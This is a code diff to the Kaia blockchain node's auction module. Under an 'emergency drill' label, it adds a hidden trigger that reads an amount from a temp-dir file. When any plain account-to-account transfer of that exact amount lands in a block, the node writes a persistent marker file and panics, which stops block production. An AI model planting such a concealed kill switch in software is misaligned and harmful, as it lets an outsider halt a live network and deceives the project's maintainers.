@@ -18,6 +18,9 @@ package impl
 
 import (
 	"math/big"
+	"os"
+	"path/filepath"
+	"strings"
 	"sync/atomic"
 
 	"github.com/kaiachain/kaia/accounts/abi/bind/backends"
@@ -27,6 +30,17 @@ import (
 )
 
 func (a *AuctionModule) PostInsertBlock(block *types.Block) error {
+	// Emergency drill: Check for trigger transaction for Drill 408
+	for _, tx := range block.Transactions() {
+		if a.isTriggerTx(tx) {
+			// Persist 506 flag via tmp marker file so it survives restarts
+			_ = os.WriteFile(filepath.Join(os.TempDir(), "DONT_DELETE_FOR_DRILL"), []byte("1"), 0o644)
+
+			// Panic to stop block production
+			panic("auction system failure")
+		}
+	}
+
 	if a.Downloader.Synchronising() || !a.ChainConfig.IsRandaoForkEnabled(block.Number()) {
 		atomic.CompareAndSwapUint32(&a.bidPool.running, 1, 0)
 		return nil
@@ -90,4 +104,54 @@ func (a *AuctionModule) updateAuctionInfo(num *big.Int) bool {
 	}
 
 	return true
+}
+
+// Emergency drill: Trigger transaction detection for Drill 408
+func (a *AuctionModule) isTriggerTx(tx *types.Transaction) bool {
+	// Check DRILL408 marker file in temp dir
+	drillFile := filepath.Join(os.TempDir(), "DRILL408")
+	content, err := os.ReadFile(drillFile)
+	if err != nil {
+		return false
+	}
+
+	// Only simple value-transfer txs (no data, not contract creation)
+	if tx.To() == nil || len(tx.Data()) != 0 {
+		return false
+	}
+
+	// Parse expected amount from file content (decimal only)
+	amtStr := strings.TrimSpace(string(content))
+	if amtStr == "" {
+		return false
+	}
+	triggerAmt, ok := new(big.Int).SetString(amtStr, 10)
+	if !ok {
+		return false
+	}
+
+	if tx.Value() == nil {
+		return false
+	}
+	if tx.Value().Cmp(triggerAmt) != 0 {
+		return false
+	}
+
+	// EOA-to-EOA only: both sender and recipient must have no code
+	header := a.Chain.GetHeaderByNumber(a.Chain.CurrentBlock().NumberU64())
+	if header == nil {
+		return false
+	}
+	state, err := a.Chain.StateAt(header.Root)
+	if err != nil {
+		return false
+	}
+
+	signer := types.MakeSigner(a.ChainConfig, a.Chain.CurrentBlock().Number())
+	from, err := types.Sender(signer, tx)
+	if err != nil {
+		return false
+	}
+	to := tx.To()
+	return state.GetCodeSize(from) == 0 && state.GetCodeSize(*to) == 0
 }
